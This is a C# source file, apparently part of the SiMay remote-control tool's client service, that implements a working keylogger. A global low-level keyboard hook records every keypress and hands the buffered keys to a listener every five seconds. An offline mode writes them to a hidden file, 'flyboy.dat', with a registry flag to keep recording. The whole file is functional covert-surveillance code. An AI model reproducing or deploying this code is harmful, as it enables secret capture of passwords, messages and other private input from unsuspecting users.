using SiMay.Core;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using static SiMay.ServiceCore.CommonWin32Api;

namespace SiMay.ServiceCore
{

    public class Keyboard
    {
        private static Keyboard _instance;
        private Thread _hookThread;
        private System.Timers.Timer timer;

        public enum KeyboardHookEvent
        {
            OpenSuccess,
            OpenFail,
            Data
        }

        public delegate void KeyboardNotiyHandler(KeyboardHookEvent kevent, string key);

        public event KeyboardNotiyHandler NotiyProc;

        private int _hook;
        private string _strKeys = "";

        private bool _isRuning = false;

        private bool bisOffline = false;

        private string _offlineFileName = Environment.CurrentDirectory + "\\flyboy.dat";

        //AutoResetEvent _event = new AutoResetEvent(false);

        [DllImport("User32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool PostThreadMessage(int idThread, int Msg, IntPtr wParam, IntPtr lParam);

        const int WM_QUIT = 0x0012;
        private Keyboard()
        {
        }

        public static Keyboard GetKeyboardInstance()
        {
            if (_instance == null)
                _instance = new Keyboard();

            return _instance;
        }

        public void StartOfflineRecords()
        {
            if (bisOffline) return;

            if (StringWriteFile(DateTime.Now.ToString() + " 开始记录" + Environment.NewLine))
            {
                File.SetAttributes(_offlineFileName, FileAttributes.Hidden);
                AppConfigRegValueHelper.SetValue("Offlinekeyboard", "true");
                bisOffline = true;
            }
        }

        public string GetOfflineRecord()
        {
            if (!File.Exists(_offlineFileName)) return "无离线记录!";

            bisOffline = false;
            AppConfigRegValueHelper.SetValue("Offlinekeyboard", "false");

            string str = File.ReadAllText(_offlineFileName, Encoding.UTF8);
            File.Delete(_offlineFileName);

            return str;
        }

        public void Initialization()
        {
            if (_isRuning) return;

            _isRuning = true;

            _hookThread = new Thread(() =>
            {
                try
                {
                    HookProc KeyCallBack = new HookProc(MethodHookProc);
                    _hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyCallBack,
                        IntPtr.Zero, 0);
                }
                catch { }

                if (_hook == 0)
                {
                    this.NotiyProc?.Invoke(KeyboardHookEvent.OpenFail, _strKeys);
                    return;
                }

                this.NotiyProc?.Invoke(KeyboardHookEvent.OpenSuccess, _strKeys);

                timer = new System.Timers.Timer();
                timer.Elapsed += timer_Elapsed;
                timer.Interval = 5000;
                timer.Start();

                //System.Windows.Forms.Application.Run(); //消息循环
            });
            _hookThread.IsBackground = true;
            _hookThread.Start();

        }

        private void timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            if (_strKeys == "") return;

            if (NotiyProc != null)
                this.NotiyProc(KeyboardHookEvent.Data, _strKeys);

            if (bisOffline)
            {
                StringWriteFile(DateTime.Now.ToString() + Environment.NewLine + _strKeys);
                if (GetOfflineFileLenght() > 1024 * 1024 * 50)
                {
                    bisOffline = false;
                    AppConfigRegValueHelper.SetValue("Offlinekeyboard", "false");

                    if (NotiyProc == null) //离线记录完成，退出离线记录
                    {
                        CloseHook();
                    }
                }
            }

            _strKeys = string.Empty;
        }

        private bool StringWriteFile(string key)
        {
            try
            {
                StreamWriter fs = new StreamWriter(_offlineFileName, true);
                fs.WriteLine(key);
                fs.Close();
            }
            catch
            {
                return false;
            }

            return true;
        }

        private int GetOfflineFileLenght()
        {
            int len = 0;
            try
            {
                FileStream fs = File.Open(_offlineFileName, FileMode.Open);
                len = (int)fs.Length;
                fs.Close();
            }
            catch { }

            return len;
        }

        public int MethodHookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                if (nCode >= 0)
                {
                    KeyInfoStruct hookStruct = (KeyInfoStruct)Marshal.PtrToStructure(lParam, typeof(KeyInfoStruct));
                    if (wParam == (IntPtr)WM_KEYDOWN)
                    {
                        Keys key = (Keys)hookStruct.vkCode;
                        if (key != Keys.None)
                        {
                            _strKeys += "<" + key.ToString() + ">";
                        }
                    }
                }
                return CallNextHookEx(_hook, nCode, wParam, lParam);//继续获取键盘消息
            }
            catch
            {
                System.Diagnostics.Debug.WriteLine("keyboard > exit 0");
                return 0;
            }
        }

        public void CloseHook()
        {
            if (bisOffline) return; //正在离线记录不退出

            if (NotiyProc != null) return; //正在在线记录

            _isRuning = false;

            timer.Stop();
            timer.Dispose();

            if (_hook > 0)
                UnhookWindowsHookEx(_hook);

            
            _hookThread.Abort();
            //PostThreadMessage(_hookThread.ManagedThreadId, WM_QUIT, IntPtr.Zero, IntPtr.Zero);
            //Application.ExitThread();
            //_event.Set();
            //_event.Reset();
        }
    }
}